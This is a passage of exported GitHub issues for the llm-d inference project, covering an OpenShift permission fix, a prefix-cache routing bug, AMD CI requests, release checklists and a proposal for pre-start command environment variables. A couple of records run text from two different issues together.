(EngineCore pid=84) torch._inductor.exc.InductorError: PermissionError: [Errno 13] Permission denied: '/.triton'
(EngineCore pid=84) ERROR ... EngineCore failed to start.
RuntimeError: Engine core initialization failed.
```

Root cause: under OpenShift's default `restricted-v2` SCC, the container runs as an arbitrary high UID (e.g. `1000800000`). The `vllm/vllm-openai` image is built with `/` owned by root, so `os.makedirs('/.config', ...)` and `os.makedirs('/.triton', ...)` both fail.

The upstream overlay already mounts an `emptyDir` at `/.cache` (for `torch.compile`'s cache directory) — this was clearly added with non-root-friendly cache paths in mind. The same fix is needed for `/.config` (used by vllm's `usage_lib._USAGE_STATS_JSON_PATH`) and `/.triton` (Triton compiler cache, fatal — kills engine init).

This is reproducible on any Kubernetes distribution that enforces non-root execution by default. OpenShift is the most prominent example, but plain k8s with PSA `restricted` baseline + a non-root pod security policy hits the same wall.

### Expected behavior

The optimized-baseline overlay should run on OpenShift's default SCC out of the box, since the README is explicit that OpenShift is a supported target ("Nightly - optimized baseline E2E (OpenShift)" CI badge in README).

### Reproduction

```bash
# Cluster: OpenShift 4.20.x, default SCC binding for new pods
git clone https://github.com/llm-d/llm-d.git && cd llm-d
kubectl create namespace llm-d-test
kubectl apply -n llm-d-test -k guides/optimized-baseline/modelserver/gpu/vllm/

# Pod CrashLoopBackOff within ~30 seconds; logs show /.triton PermissionError
kubectl logs -n llm-d-test -l llm-d.ai/role=decode --previous | grep -i Permission
```

### Fix

Two additional `emptyDir` volumes mounted at `/.config` and `/.triton`. Strategic merge patch we used:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: decode
spec:
  template:
    spec:
      containers:
        - name: modelserver
          volumeMounts:
            - mountPath: /.config
              name: vllm-config
            - mountPath: /.triton
              name: triton-cache
      volumes:
        - name: vllm-config
          emptyDir: {}
        - name: triton-cache
          emptyDir: {}
```

After applying this patch, vLLM boots normally and serves requests.

### Question for maintainers

The README has a passing nightly CI badge for OpenShift (`nightly-e2e-optimized-baseline-ocp.yaml`). How does that CI get past these PermissionErrors? Either:

- The CI uses an overlay/patch that isn't in the documented quickstart path
- The CI runs with a less-restricted SCC (e.g. `anyuid`) than the default
- The image being tested in CI differs from `vllm/vllm-openai:v0.19.1`

If the fix is one of these, surfacing it in the optimized-baseline README would close the gap for users who follow the documented path against a default-configured OpenShift cluster.

### Version

v0.6.0

### Relevant log output

```shell
(EngineCore pid=84) Exception in thread Thread-1 (_report_usage_worker):
(EngineCore pid=84)   File "/usr/local/lib/python3.12/dist-packages/vllm/usage/usage_lib.py", line 276, in _write_to_file
(EngineCore pid=84)     os.makedirs(os.path.dirname(_USAGE_STATS_JSON_PATH), exist_ok=True)
(EngineCore pid=84) PermissionError: [Errno 13] Permission denied: '/.config'

(EngineCore pid=84) ERROR [core.py:1108] EngineCore failed to start.
(EngineCore pid=84) ERROR ...
(EngineCore pid=84)   File "/usr/local/lib/python3.12/dist-packages/triton/runtime/cache.py", line 55, in __init__
(EngineCore pid=84)     os.makedirs(self.cache_dir, exist_ok=True)
(EngineCore pid=84) torch._inductor.exc.InductorError: PermissionError: [Errno 13] Permission denied: '/.triton'

RuntimeError: Engine core initialization failed. See root cause above.
```

records.title: [Feature] prefix-based-pd-decider misroutes RAM-cached requests to remote prefill due to weight/match-count semantic conflation
records.body:
### Feature Area

Prefill/Decode Disaggregation

### Problem Statement

⚠️ NOTE:  this issue comes from real usage but context generated by Opus 4.7


## Summary
prefix-based-pd-decider decides whether to run remote prefill (P/D) by computing nonCachedTokens = inputTokens − matchBlocks × blockSize. The matchBlocks it reads is sourced from precise-prefix-cache-scorer, which assigns matchLen := int(score), where score is the device-tier-weighted sum produced by LongestPrefixScorer (GPU=1.0, CPU=0.8 by default).

The weight is meant for ranking endpoints during scoring, not for representing actual cached token count. Conflating these two semantics causes RAM-cached blocks to be undercounted by 20%, which inflates nonCachedTokens and pushes requests with large local-RAM hits onto the remote-prefill path — the opposite of what an LMCache / CPU-offload deployment wants.

## User story
As an operator running disaggregated llm-d with vLLM CPU offload (LMCache or built-in offloading), I expect that when most of my prompt is already cached in the decoder pod's RAM, the request stays as a plain decoder-only request — at most a host-to-device copy plus a short suffix prefill. Today, the more I cache in RAM, the more likely the EPP is to misroute my request to a remote prefiller, doubling latency.

## issue
Configuration: blockSize=16, nonCachedTokens=512, inputTokens=4096, contiguous prefix hit on 240 blocks (3840 tokens, ~94% of prompt), all hits on the selected D pod.

Hit location on D | score | matchLen | hitPrefixTokens | nonCachedTokens | Decision
-- | -- | -- | -- | -- | --
HBM (weight 1.0) | 240.0 | 240 | 3840 | 256 | skip prefill ✅
RAM (weight 0.8) | 192.0 | 192 | 3072 | 1024 | trigger P/D ❌

Real uncached suffix is 256 tokens in both cases; the RAM case is misclassified.



## Where it happens
pkg/epp/framework/plugins/scheduling/scorer/preciseprefixcache/precise_prefix_cache.go — assigns weighted score to matchLen:
```
matchLen := int(scores[addr])
ep.Put(attrprefix.PrefixCacheMatchInfoKey,
    attrprefix.NewPrefixCacheMatchInfo(matchLen, len(blockKeys), blockSize))
```

pkg/epp/framework/plugins/scheduling/profilehandler/disagg/prefix_based_pd_decider.go — uses matchBlocks as a literal cached-block count:
```
hitPrefixTokens := prefixCacheMatchInfo.MatchBlocks() * prefixCacheMatchInfo.BlockSizeTokens()
nonCachedTokens := inputTokens - hitPrefixTokens
```

LongestPrefixScorer in llm-d-kv-cache is correct in isolation — the misuse is on the inference-scheduler side.


## Why it gets worse with more cached blocks
Bias ≈ (1 − w) × m × blockSize tokens, i.e. every additional RAM-cached block adds ~3.2 fictitious uncached tokens to the decider's view. With more local cache, the misrouting rate goes up, not down.




### Proposed Solution


# Proposed fix
Decouple "ranking weight" from "match count":

Minimal fix: have precise-prefix-cache-scorer populate PrefixCacheMatchInfo.matchBlocks with the unweighted number of contiguous prefix hits on the selected pod, while still using the weighted score for endpoint ranking.
Better: extend PrefixCacheMatchInfo with per-tier hit counts (matchBlocksHBM, matchBlocksRAM) so deciders can apply tier-aware thresholds and cost models (HBM hit ≈ free, RAM hit ≈ H2D copy, remote P hit ≈ NIXL RDMA).
Optional: make nonCachedTokens configurable per tier, e.g.:

```
nonCachedTokens:
  afterLocalHBM: 0       # always skip P/D if HBM has it
  afterLocalAny: 512     # treat HBM+RAM identically vs threshold
```


### Alternatives Considered

NA

### Willingness to Contribute

Yes, with guidance

### Additional Context

_No response_

records.title: [CI/CD][AMD]: Support Nightly Jobs on MI3xxX & Pollara NICs
records.body:
### Feature Area

CI/CD

### Problem Statement

Hi @powderluv @chunfangamd @andyluo7 @kenroche

llm-d's nightly CI/CD currently consumes **288+ NVIDIA GPUs+ & NVIDIA ConnectX-7 NIC** across NVIDIA Clouds — CoreWeave, IBM, and Google Cloud, yet there is basically **no AMD GPU CI/CD** & **no AMD Pollara NIC CI/CD** in this repository today.

Despite llm-d being an [officially supported AMD project](https://rocm.blogs.amd.com/artificial-intelligence/llm-d-distributed/README.html) and a [production deployment target for AMD customers for example Oracle and other customers](https://blogs.oracle.com/ai-and-datascience/llm-inference-at-scale-with-llm-d-on-oci), it does not currently have CI/CD. Not only is it important for AMD to have first class CI in vLLM, which has massively improved over the past couple of weeks but at the production kubernetes orchestrator operator layer, there should be first class CI/CD too.

This issue is to about the question of the timeline for when AMD for standing up AMD GPU nightly CI to parity with the existing NVIDIA workflows in `.github/workflows/`.


## Current state — NVIDIA

Three of the most recent nightly E2E runs:

- `nightly-e2e-optimized-baseline-cks.yaml` (CoreWeave, May 10, 48 NVIDIA GPU with InfiniBand ConnectX-7) — https://github.com/llm-d/llm-d/actions/runs/25627608892
- `nightly-e2e-optimized-baseline-gke.yaml` (GKE / Google Cloud, May 10, 128 NVIDIA GPU with Google Custom FASTrak Ethernet Networking) — https://github.com/llm-d/llm-d/actions/runs/25627609398
- `nightly-e2e-optimized-baseline-ocp.yaml` (IBM / Red Hat OpenShift, May 9, NVIDIA GPU with ConnectX-7 RoCEv2 Ethernet ) — https://github.com/llm-d/llm-d/actions/runs/25586288982

Scheduled nightly runs across IBM / Red Hat OpenShift, CKS, and GKE for PD disaggregation, precise prefix cache, predicted-latency balancing, wide-EP, and WVA. Combined, this is **288+ NVIDIA datacenter GPUs** with NVIDIA first party NICs catching regressions every single day for NVIDIA users.

## Current state — AMD

Basically no AMD CI workflows, AMD-hosted runners, MI300X / MI325X / MI355X coverage https://github.com/llm-d/llm-d/actions

## Ask

What is AMD's timeline for bringing up nightly CI for llm-d to have parity with CUDA CI?

### Required nightly workflow coverage (AMD parity targets)

- [ ] **ROCm using AMD first party Pollara NIC equivalent of PD disaggregation E2E Nightly CI** — https://github.com/llm-d/llm-d/actions/workflows/nightly-e2e-pd-disaggregation-ocp.yaml 
- [x] **ROCm using AMD first party Pollara NIC equivalent of Optimized baseline E2E Nightly CI** —  https://github.com/llm-d/llm-d/actions/workflows/nightly-e2e-optimized-baseline-cks.yaml
- [ ] **ROCm using AMD first party Pollara NIC equivalent of  Wide-EP E2E  Nightly CI** — https://github.com/llm-d/llm-d/actions/workflows/e2e-wide-ep-accelerator-gke.yaml (MoE / DeepSeek-R1-class DP+EP across multi-nodes)
- [ ] **ROCm using AMD first party Pollara NIC equivalent of Precise prefix-cache aware E2E Nightly CI** — https://github.com/llm-d/llm-d/actions/workflows/nightly-e2e-precise-prefix-cache-ocp.yaml
- [x] **ROCm using AMD first party Pollara NIC equivalent of Predicted-latency balancing E2E (OCP)** — https://github.com/llm-d/llm-d/actions/workflows/nightly-e2e-predicted-latency-ocp.yaml
- [ ] **ROCm using AMD first party Pollara NIC equivalent of Workload Variant Autoscaler (WVA) E2E Nightly CI** — https://github.com/llm-d/llm-d/blob/main/.github/workflows/nightly-e2e-wva-cks.yaml
- [ ] **ROCm using AMD first party Pollara NIC equivalent of Nightly - Flow Control E2E Nightly CI** — [nightly-e2e-flow-control-gke-acc-gpu-vllm-x.yaml](https://github.com/llm-d/llm-d/blob/main/.github/workflows/nightly-e2e-flow-control-gke-acc-gpu-vllm-x.yaml)



### Proposed Solution

@powderluv adds CI to llm-d for ROCm

AMD's CI pool for `llm-d` should be additive and not takeaway from ROCm CI pool for vllm/sglang, or ROCm internal inferencing teams or the SGLang/vLLM upstream maintainers community cluster. No hot potato please of shifting nodes around, the AMD developer/CI node pool needs to expand

### Alternatives Considered

not have CI and have bad code quality

No, but I can help test

### Feature Area

Prefill/Decode Disaggregation

### Problem Statement

Hi @powderluv @chunfangamd @andyluo7 @kenroche @vcave,

Right now the only AMD P/D disaggregation "well-lit" path in llm-d (#776 , https://github.com/andyluo7/llm-d/blob/main/guides/pd-disaggregation/README.amd.md) **ONLY** ships RIXL as the KV transfer engine. AMD's first class KVCache Transfer library is [**MoRI-IO**](https://github.com/ROCm/mori) yet it does not have an well lit path in AMD's `llm-d`

@simondanielsson is already trying to get MoRI-IO running in upstream vLLM native engine with vllm router tho there is additional work to get MoRI-IO to be well lit in `llm-d`

the `llm-d` ROCm do not work with MoRI-IO either on Pollara or Thor-2 NICs https://github.com/llm-d/llm-d/blob/main/docker/Dockerfile.rocm


### Proposed Solution

have well-lit path for MoRI-IO KVCache Transfer for AMD `llm-d`

records.title: Release v0.7.0
records.body:
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Release Process](#release-process)
- [Announce the Release](#announce-the-release)
- [Final Steps](#final-steps)

## Introduction

This document defines the process for releasing llm-d.

## Prerequisites

1. Permissions to push to the llm-d repository.

1. Set the required environment variables based on the expected release number:

   ```shell
   export MAJOR=0
   export MINOR=7
   export PATCH=0
   export REMOTE=upstream
   ```

1. If creating a release candidate, set the release candidate number.

   ```shell
   export RC=1
   ```
1. If needed, clone the llm-d [repo].

   ```shell
   git clone -o ${REMOTE} git@github.com:llm-d/llm-d.git
   ```

## Release Process

### Create or Checkout branch 

1. If you already have the repo cloned, ensure it’s up-to-date and your local branch is clean.

1. Release Branch Handling:
   - For a Release Candidate:
     Create a new release branch from the `main` branch. The branch should be named `release-${MAJOR}.${MINOR}`, for example, `release-0.1`:

     ```shell
     git checkout -b release-${MAJOR}.${MINOR}
     ```

   - For a Major, Minor or Patch Release:
     A release branch should already exist. In this case, check out the existing branch:

     ```shell
     git checkout -b release-${MAJOR}.${MINOR} ${REMOTE}/release-${MAJOR}.${MINOR}
     ```

1. Set all `branch` environment variables on all the [guides](../../guides) to the release branch name (i.e.,`release-${MAJOR}.${MINOR}`)
     ```shell
     git commit -a -s -S -m "updated branch environment variable on all guides to release-${MAJOR}.${MINOR}"
     ```

1. Push your release branch to the llm-d remote.

    ```shell
    git push ${REMOTE} release-${MAJOR}.${MINOR}
    ```

### Tag commit and trigger image build

1. Tag the head of your release branch with the sem-ver release version.

   For a release candidate:

    ```shell
    git tag -s -a v${MAJOR}.${MINOR}.${PATCH}-rc.${RC} -m 'llm-d v${MAJOR}.${MINOR}.${PATCH}-rc.${RC} Release Candidate'
    ```

   For a major, minor or patch release:

    ```shell
    git tag -s -a v${MAJOR}.${MINOR}.${PATCH} -m 'llm-d v${MAJOR}.${MINOR}.${PATCH} Release'
    ```

1. Push the tag to the llm-d repo.

   For a release candidate:

    ```shell
    git push ${REMOTE} v${MAJOR}.${MINOR}.${PATCH}-rc.${RC}
    ```

   For a major, minor or patch release:

    ```shell
    git push ${REMOTE} v${MAJOR}.${MINOR}.${PATCH}
    ```

1. Pushing the tag triggers CI action to build and publish the container image to the [ghcr registry].
1. Test the steps in the tagged quickstart guide after the PR merges. TODO add e2e tests! <!-- link to an e2e tests once we have such one -->

### Create the release!

1. Create a [new release]:
    1. Choose the tag that you created for the release.
    1. Use the tag as the release title, i.e. `v0.1.0` refer to previous release for the content of the release body.
    1. Click "Generate release notes" and preview the release body.
    1. Go to Gateway Inference Extension latest release and make sure to include the highlights in llm-d as well.
    1. If this is a release candidate, select the "This is a pre-release" checkbox.
1. If you find any bugs in this process, create an [issue].

## Announce the Release

Use the following steps to announce the release.

1. Send an announcement email to `llm-d-contributors@googlegroups.com` with the subject:

   ```shell
   [ANNOUNCE] llm-d v${MAJOR}.${MINOR}.${PATCH} is released
   ```

1. Add a link to the final release in this issue.

1. Close this issue.

[repo]: https://github.com/llm-d/llm-d
[ghcr registry]: https://github.com/llm-d/llm-d/pkgs/container/llm-d
[new release]: https://github.com/llm-d/llm-d/releases/new
[issue]: https://github.com/llm-d/llm-d/issues/new/choose

records.title: [sig-rl] Platform-native time slicing for RL rollout
records.body:
## Summary

Enable platform-native GPU time slicing to improve hardware utilization in RL workflows by dynamically interleaving training and rollout workloads during natural blocking phases.

## Context

RL loops experience natural blocking phases (CPU-bound reward evaluations, generation stragglers, synchronization) where GPU hardware sits idle for 45-66% of its lifecycle. Traditional solutions require rewriting RL algorithms to off-policy architectures, trading infrastructure efficiency for mathematical convergence risk.

Platform-native time slicing shifts optimization to the infrastructure layer via job interleaving, dynamically swapping workloads during idle gaps while preserving on-policy mathematical guarantees.

## Summary

Add a daily Slack report summarizing the status of all nightly CI workflows. This improves operational visibility into CI health and helps teams quickly identify failing tests requiring attention.

## Proposed Solution

Create `.github/workflows/nightly-status-report.yaml` that runs daily at 12:00 UTC (after all nightlies complete) and posts a Slack message summarizing results.

**Implementation:**
1. Create Slack incoming webhook for `#llm-d-ci` (or similar channel)
2. Add `SLACK_NIGHTLY_WEBHOOK` to GitHub secrets
3. Create workflow that:
   - Fetches last run status for each nightly workflow
   - Aggregates results (passed/failed counts)
   - Formats Slack message with links to failed runs
   - Posts via webhook

**Future enhancements:**
- Track consecutive failures (add emoji for chronic issues)
- Compare today vs yesterday (trend indicators)
- Alert on-call when critical tests fail
- Weekly summary with pass rate graphs

records.title: [Docs]: Add Agentic Serving well-lit path
records.body:
### Feature Area

Documentation / Guides

### Problem Statement

As AI applications transition to complex, multi-turn agentic workflows, they face high latency and more costs due to long context sizes and idle compute capacity during tool-use pauses. While llm-d offers features to mitigate this—such as KV-cache aware routing, P/D, and tiered KV caching—there is currently no unified, end-to-end guide explaining how to stitch these components together. This leaves the documentation fragmented and makes it difficult for platform engineers to implement optimal architectures for stateful agents.

### Proposed Solution

Create a new Well-Lit Path guide for Agentic Serving that details the end-to-end architecture and configuration. The guide will provide a step-by-step blueprint for combining router session stickiness, disaggregated serving  (P/D), and tiered KV cache offloading (Host DRAM and remote POSIX storage. It will document best practices, such as mitigating POSIX lock contention and optimizing I/O parallelism, to help users deploy stable, high-performance agentic workloads. Additionally, it will link to benchmarks from the llm-d results store & prism that help users map their workloads to configurations.

### Alternatives Considered

_No response_

### Willingness to Contribute

Yes, I can submit a PR

### Additional Context

I'm working with @achandrasekar (sig-benchmarking) who developed a real-world agentic workload catalog which is used by inference-perf to apply load for benchmarking. We're running this workload on a range of llm-d configurations (routing, P/D, tiered kv caching) and we want to publish these configs & benchmarks as part of this guide.

records.title: [Feature]: Support `LLMD_PRE_START_COMMAND` and `LLMD_EXTRA_VLLM_ARGS` in model server patches
records.body:
### Feature Area

Deployment / Helm Charts

### Problem Statement

We are working on making diagnosing llm-d networking issues easier. We developed a "preflight checks" approach and implemented it as [llm-d-preflight-checks skill](https://github.com/llm-d/llm-d-pd-utils/blob/main/skills/llm-d-preflight-checks/SKILL.md).

It works but currently requires a two-stage approach - first deploying the model then patching the model server deployment to add preflight-checks script, an environment variable, and a volume containing the script.

It would be great to have a generic mechanism to customize llm-d deployment to modify the entry point and pass parameters, etc.

We think our use case make strong arguments for adding those customizations.

Adding any pre-vLLM startup logic (diagnostics, preflight checks, network validation) currently requires creating a full custom kustomize overlay that:

1. Replaces `command: ["vllm", "serve"]` with `command: ["bash", "-c"]`
2. Reconstructs the entire `vllm serve` arguments as a single shell string (model name, TP size, KV config, etc.)
3. Adds ConfigMap volumes and volume mounts
4. Adds environment variables

This results in **30+ lines of new YAML per deployment** that must duplicate model-specific vLLM arguments from the upstream patch. When upstream changes vLLM args (model name, TP size, flags), these custom overlays silently drift out of sync.

For example, the [P/D disaggregation guide](https://github.com/llm-d/llm-d/tree/main/guides/pd-disaggregation) defines vLLM args in [`patch-prefill.yaml`](https://github.com/llm-d/llm-d/blob/main/guides/pd-disaggregation/modelserver/gpu/vllm/base/patch-prefill.yaml) and [`patch-decode.yaml`](https://github.com/llm-d/llm-d/blob/main/guides/pd-disaggregation/modelserver/gpu/vllm/base/patch-decode.yaml). To add a pre-start command, an operator must create a new overlay that duplicates all of those args inside a `bash -c` string — any upstream change to those patches requires manually updating the overlay.

**Use cases this enables:**
- Run preflight diagnostics before vLLM allocates GPU memory
- Validate networking/RDMA before serving traffic
- Debug pod startup without CrashLoopBackOff (pause mode)
- Append vLLM flags (e.g., `--enable-chunked-prefill`, `--max-model-len`) without reconstructing the entire args array

Related: [llm-d-infra#286](https://github.com/llm-d-incubation/llm-d-infra/issues/286) requests similar Helm-level support (`extraConfigMapVolumes`, `extraEnv`, `preStartCommands`) for the router chart.


### Proposed Solution

The proposed solution is based on investigation with Claude Code - it was just to explore and confirm one possible way to get it working. We are open to any other way of solving the problem described above.

The proposed solution is to add two environment variables recognized by the model server entrypoint that enable pre-start customization **without replacing the command/args structure**:

| Variable | Purpose | Default |
|----------|---------|---------|
| `LLMD_PRE_START_COMMAND` | Shell command(s) executed before `vllm serve` via `&&` chain | unset (no-op) |
| `LLMD_EXTRA_VLLM_ARGS` | Additional vLLM CLI flags appended to the serve command | unset (no-op) |

This follows the same pattern as `MODEL_NAME` — a simple env var that customizes deployment behavior without modifying the underlying YAML structure.

### How it works

Change the guide-level patch files from:

```yaml
# Current: guides/pd-disaggregation/modelserver/gpu/vllm/base/patch-prefill.yaml
containers:
  - name: modelserver
    command: ["vllm", "serve"]
    args:
      - "openai/gpt-oss-120b"
      - "--tensor-parallel-size=1"
      - "--block-size=128"
      - "--kv-transfer-config"
      - '{"kv_connector":"NixlConnector", "kv_role":"kv_both"}'
      - "--no-disable-hybrid-kv-cache-manager"
      - "--gpu-memory-utilization=0.9"
```

To:

```yaml
# Proposed: bash -c wrapper with env var expansion
containers:
  - name: modelserver
    command: ["bash", "-c"]
    args:
      - |
        ${LLMD_PRE_START_COMMAND:+$LLMD_PRE_START_COMMAND &&} \
        exec vllm serve openai/gpt-oss-120b \
          --disable-access-log-for-endpoints=/health,/metrics,/v1/models \
          --tensor-parallel-size=1 \
          --block-size=128 \
          --kv-transfer-config '{"kv_connector":"NixlConnector", "kv_role":"kv_both"}' \
          --no-disable-hybrid-kv-cache-manager \
          --gpu-memory-utilization=0.9 \
          ${LLMD_EXTRA_VLLM_ARGS}
```

Key design points:
- `${VAR:+...}` bash syntax: if unset or empty, expands to nothing (no-op). If set, expands to `<command> &&`
- `exec` replaces bash with vLLM as PID 1 so Kubernetes SIGTERM goes directly to vLLM for graceful shutdown
- The vllm-openai image is Ubuntu 22.04-based and includes `/bin/bash`
- Kubernetes does not evaluate `${...}` in args — only `bash -c` does at runtime

### Files to modify

| Guide | File |
|-------|------|
| P/D disaggregation (prefill) | [`guides/pd-disaggregation/modelserver/gpu/vllm/base/patch-prefill.yaml`](https://github.com/llm-d/llm-d/blob/main/guides/pd-disaggregation/modelserver/gpu/vllm/base/patch-prefill.yaml) |
| P/D disaggregation (decode) | [`guides/pd-disaggregation/modelserver/gpu/vllm/base/patch-decode.yaml`](https://github.com/llm-d/llm-d/blob/main/guides/pd-disaggregation/modelserver/gpu/vllm/base/patch-decode.yaml) |
| Optimized baseline (quickstart) | [`guides/optimized-baseline/modelserver/gpu/vllm/base/patch-vllm.yaml`](https://github.com/llm-d/llm-d/blob/main/guides/optimized-baseline/modelserver/gpu/vllm/base/patch-vllm.yaml) |

The base deployment templates ([`prefill-deployment.yaml`](https://github.com/llm-d/llm-d/blob/main/guides/recipes/modelserver/base/single-host/pd/base/prefill-deployment.yaml)) have `command: []` and `args: []` — they are already designed to be overridden by guide-level patches, so no changes are needed at the base recipe level.

### ConfigMap volume for scripts

Add an optional ConfigMap volume to the base deployment template so pre-start scripts are available when needed:

```yaml
volumes:
  - name: preflight-scripts
    configMap:
      name: llm-d-preflight-checks
      defaultMode: 0755
      optional: true
volumeMounts:
  - name: preflight-scripts
    mountPath: /preflight
```

When the ConfigMap doesn't exist, the volume is simply empty — no error, no impact on existing deployments. Operators create it only when needed:

```bash
kubectl create configmap llm-d-preflight-checks \
  --from-file=llm-d-preflight-checks.py=path/to/script.py -n ${NAMESPACE}
```

### Usage examples

**Enable preflight checks (2 env vars instead of 30+ line overlay):**

```bash
kubectl set env deployment/pd-disaggregation-nvidia-gpu-vllm-prefill \
  LLMD_PRE_START_COMMAND="python3 /preflight/llm-d-preflight-checks.py" \
  LLMD_PREFLIGHT_CHECKS=pause

kubectl set env deployment/pd-disaggregation-nvidia-gpu-vllm-decode \
  LLMD_PRE_START_COMMAND="python3 /preflight/llm-d-preflight-checks.py" \
  LLMD_PREFLIGHT_CHECKS=pause \
  VLLM_INFERENCE_PORT=8200
```

**Add extra vLLM flags without rebuilding args:**

```bash
kubectl set env deployment/pd-disaggregation-nvidia-gpu-vllm-prefill \
  LLMD_EXTRA_VLLM_ARGS="--enable-chunked-prefill --max-model-len=4096"
```

**Minimal kustomize patch:**

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: placeholder
spec:
  template:
    spec:
      containers:
        - name: modelserver
          env:
            - name: LLMD_PRE_START_COMMAND
              value: "python3 /preflight/llm-d-preflight-checks.py"
            - name: LLMD_PREFLIGHT_CHECKS
              value: "pause"
```

### Benefits

| Before (current) | After (proposed) |
|-------------------|------------------|
| 30+ line custom kustomize overlay per guide | 2 env vars (`kubectl set env` or 5-line patch) |
| Must duplicate all vLLM args in shell string | vLLM args stay in upstream patch, no duplication |
| Custom overlay drifts when upstream changes | No drift — env vars are additive |
| Different overlay needed per guide | Same env vars work across all guides |
| Hard to audit with `helm diff` / `kubectl diff` | Changes visible as env var diffs |


### Alternatives Considered


| Approach | Why not |
|----------|---------|
| Full custom kustomize overlay (current workaround) | 30+ lines per deployment, duplicates vLLM args, silently drifts with upstream changes |
| Post-deploy JSON patch (`kubectl patch`) | Fragile, races with rollout, must reconstruct exact args array |
| Init containers | Cannot gate vLLM start with `&&` (init runs in separate container), different health probe lifecycle |
| Sidecar with shared PID namespace | Over-engineered for a startup gate, adds operational complexity |
| General `extraVolumes` / `extraVolumeMounts` env var | More flexible but significantly more complex to implement in kustomize (would require a controller or init script to parse JSON env vars into volume specs) |

### Willingness to Contribute

Yes, I can submit a PR

### Additional Context


### Acceptance criteria

- [ ] Guide-level patch files use `bash -c` wrapper with `LLMD_PRE_START_COMMAND` expansion
- [ ] `LLMD_EXTRA_VLLM_ARGS` is appended to vllm serve command when set
- [ ] Deployments work identically when both vars are unset (no behavioral change)
- [ ] Optional ConfigMap volume (`llm-d-preflight-checks`) added to base deployment template
- [ ] P/D disaggregation guide works unchanged with no env vars set
- [ ] Optimized-baseline (quickstart) guide works unchanged with no env vars set
- [ ] Documentation updated showing how to enable pre-start commands

### Feasibility notes

- The `vllm/vllm-openai` image is built on `nvidia/cuda:*-base-ubuntu22.04` — bash is available at `/bin/bash`
- Kubernetes does NOT evaluate `${VAR:+...}` in container args — only `bash -c` interprets it at runtime
- `exec vllm serve` replaces the bash shell as PID 1, ensuring proper signal forwarding for graceful shutdown
- YAML block scalar (`|`) for multiline args works correctly with kustomize strategic merge patches

### Related issues

- [llm-d-infra#286](https://github.com/llm-d-incubation/llm-d-infra/issues/286) — Helm values for mounting ConfigMap scripts and customizing vLLM entrypoint (router chart)
- [llm-d#850](https://github.com/llm-d/llm-d/issues/850) — Modular installation architecture tracking issue (this proposal aligns with making kustomize overlays more composable)
- [llm-d#992](https://github.com/llm-d/llm-d/issues/992) — Local override workflow for guide-based validation (established the env var override pattern for local testing)
- [llm-d#1430](https://github.com/llm-d/llm-d/issues/1430) — CrashLoopBackOff on OpenShift due to unwritable dirs (fixed by adding volumes to patches — this proposal would make such fixes simpler)
- [llm-d#935](https://github.com/llm-d/llm-d/issues/935) — Modular guides folder restructuring (aligns with making customization more accessible)

records.title: Recommendations to mitigate envoy ext_proc overflow
records.body:
Hi and thanks for this amazing project!

I am not reporting an issue with llm-d, but want to get some community knowledge about an issue I have been seeing in my setup.

The setup is Envoy Gateway and AI Gateway in conjunction with llm-d as EPP. For quite modest amounts of requests envoy returns HTTP 500s with the following response code details:

```
ext_proc_error_gRPC_error_14{upstream_connect_error_or_disconnect/reset_before_headers._reset_reason:_overflow{upstream_reset_before_response_started{overflow}}}
```

It seems that it hits the maximum amount of connections to the ext_proc process. A colleague of mine raised this in the envoy slack and apparently there is no way to currently raise the limit, but a fix is being worked on.

Scaling the issue away with more envoy replicas seems not feasible to me, as I am seeing quite a few of these with a modest amount of requests (say ~2000 concurrent requests, more than half returning HTTP 500s, 8 envoy replicas). I think part of the issue is that LLM requests can be long-running, thus the limit gets saturated quite quickly.

So the reason I am raising this here: I imagine others have run into this problem and would like to hear about mitigation approaches.

If you rather not have this discussion here, please don't hesitate to close the issue.

Thanks :)

records.title: [Docs] Create release process documentation
records.body:
### Summary

Move the release process from the GitHub issue template (`.github/ISSUE_TEMPLATE/new-release.md`) into a proper documentation page at `docs/release-process.md`. The current template documents the llm-d/llm-d repo steps but omits the cross-repo orchestration that an actual release requires. This doc should be the single source of truth for cutting a release.

### What exists today

Each repo has its own release mechanics, but they're scattered and undocumented as a coordinated process:

**llm-d/llm-d** (`.github/ISSUE_TEMPLATE/new-release.md`)
- Create release branch `release-X.Y`
- Update `branch` env vars in all guides
- Create docs site release branch (`llm-d.github.io`)
- Tag → triggers `ci-release.yaml` (builds all CUDA/ROCm/XPU/HPU/CPU/AWS/GB200 images)
- `verify-release-images.yaml` (manual dispatch to verify all images exist)
- Create GitHub release, generate notes, announce

**llm-d/llm-d-router** (`.github/ISSUE_TEMPLATE/new-release.md`)
- Create release branch, tag → triggers `ci-release.yaml` (EPP + sidecar images)
- Automated release notes via `release-notes-update.yaml` (fragments per merged PR) and `release-notes-assemble.yaml` (assembles on tag)
- Publishes Helm charts (standalone + gateway)

**llm-d/llm-d-kv-cache** (no release template)
- Tag → triggers `ci-release.yaml` (kv-cache image) + `ci-release-uds-tokenizer.yaml` (UDS tokenizer image)
- Also publishes `llmd_fs_backend_connector` wheel

**llm-d/llm-d-workload-variant-autoscaler** (no release template)
- Tag → triggers `helm-release.yaml` (Docker image + Helm chart to GHCR)

### What's missing from documentation

1. **Release sequencing across repos** — Sub-repos (router, kv-cache, WVA) must be released _before_ llm-d/llm-d since the umbrella repo pins their versions. The order observed in v0.7 was:
   - llm-d-router v0.8.0 (Apr 28) → llm-d-kv-cache v0.8.0 (May 1) → llm-d v0.7.0 (May 12) + WVA v0.7.0 (Apr 30)
   - This sequencing is not documented anywhere.

2. **Version pinning updates** — The "Prep vX.Y.0" PR (e.g., #1270 for v0.7) bumps all image tags across guides. Key files:
   - `guides/recipes/scheduler/base.values.yaml` — router/EPP image tag
   - `docker/common-versions` — vLLM commit SHA + CUDA version
   - Every guide's `kustomization.yaml` — model server image tags per accelerator
   - This is a manual, error-prone process that should be documented with a checklist.

3. **Release candidate flow** — Router used RCs (v0.8.0-rc.1, rc.2 before GA), WVA used RCs (v0.6.0-rc1/2/3). When to cut RCs vs go straight to GA is undocumented.

4. **Validation checklist** — The template says "Test the quickstart" with a TODO. The actual validation should include:
   - Run `verify-release-images.yaml` to confirm all images published
   - Run quickstart guide against the release tag
   - Verify component version table is correct in release notes
   - Confirm docs site release branch syncs correctly

5. **Release notes assembly** — llm-d-router has automated fragment-based release notes. llm-d/llm-d and other repos use GitHub's "Generate release notes" button. This inconsistency should be documented.

6. **Hotfix/patch process** — v0.5.1 and v0.3.1 were cut as patches, but the process for cherry-picking to a release branch is undocumented.

### Proposed structure for `docs/release-process.md`

